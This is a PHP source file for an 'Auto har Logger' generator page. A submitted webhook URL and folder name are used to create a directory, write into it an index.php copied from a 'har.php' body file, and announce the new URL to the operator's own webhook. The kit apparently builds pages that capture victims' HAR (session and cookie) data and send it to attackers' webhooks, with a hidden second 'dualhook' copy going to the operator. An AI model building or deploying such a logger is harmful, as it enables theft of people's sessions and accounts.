<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $folder = $_POST['folder'];
    # ItsYaboyNathan
    include("../settings.php");
    if(!is_dir($folder)){
    mkdir("../$folder");
    } else {
	die('Directory taken by another user');
    }
    $webhook = $_POST['webhook'];
$code = file_get_contents("../body_files/har.php");
$myfile = fopen("../$folder/index.php", "w");
$txt = $code;
fwrite($myfile, '<?php $dualhook = "'.$dualhook.'"; $webhook = "'.$webhook.'"; ?>'.$txt);
$headers = ["Content-Type: application/json; charset=utf-8"];
$POST = [
    "username" => "$name - Notifier",
    "avatar_url" => "",
    "content" => "Hello!",
    "embeds" => [
        [
            "title" => "Auto Har",
            "type" => "rich",
            "color" => hexdec("$color"),
            "url" => "http://www." . $_SERVER["SERVER_NAME"] . "/$folder",
            "fields" => [
                [
                    "name" => "**Your Url:**",
                    "value" => "```http://www." . $_SERVER["SERVER_NAME"] . "/$folder```",
                    "inline" => false
                ],
            ],
        ],
    ],
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Dualwebhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
header("location: ../$folder/");
}
?>
<style>
    html {
  scroll-behavior: smooth;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  background: #121212; /* fallback for old browsers */
  overflow-x: hidden;

  height: 100%;

  /* code to make all text unselectable */
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  -o-user-select: none;
  user-select: none;
}

/* Disables selector ring */
body:not(.user-is-tabbing) button:focus,
body:not(.user-is-tabbing) input:focus,
body:not(.user-is-tabbing) select:focus,
body:not(.user-is-tabbing) textarea:focus {
  outline: none;
}

/* ########################################################## */

h1 {
  color: white;

  font-size: 35px;
  font-weight: 800;
}

.flex-container {
  width: 100vw;

  margin-top: 60px;

  display: flex;
  justify-content: center;
  align-items: center;
}

.content-container {
  width: 500px;
  height: 350px;
}

.form-container {
  display: flex;
  justify-content: center;
  align-items: center;

  width: 500px;
  height: 350px;

  margin-top: 5px;
  padding-top: 20px;

  border-radius: 12px;

  display: flex;
  justify-content: center;
  flex-direction: column;

  background: #1f1f1f;
  box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.199);
}

.subtitle {
  font-size: 11px;

  color: rgba(177, 177, 177, 0.3);
}

input {
  border: none;
  border-bottom: solid rgb(143, 143, 143) 1px;

  margin-bottom: 30px;

  background: none;
  color: rgba(255, 255, 255, 0.555);

  height: 35px;
  width: 300px;
}

.submit-btn {
  cursor: pointer;

  border: none;
  border-radius: 8px;

  box-shadow: 2px 2px 7px #38d39f70;

  background: #38d39f;
  color: rgba(255, 255, 255, 0.8);

  width: 80px;

  transition: all 1s;
}

.submit-btn:hover {
  color: rgb(255, 255, 255);

  box-shadow: none;
}

</style>
<div class="flex-container">
    <div class="content-container">
      <div class="form-container">
        <form method="post" action="index.php">
          <h1>
           Auto har Logger
          </h1>
          <br>
          <br>
          <span class="subtitle">Webhook:</span>
          <br>
          <input type="password" name="webhook" value="">
          <br>
          <span class="subtitle">Directory Name:</span>
          <br>
          <input type="text" name="folder" value="">
          <br><br>
          <input type="submit" value="generate" class="submit-btn">
        </form>
      </div>
    </div>
  </div>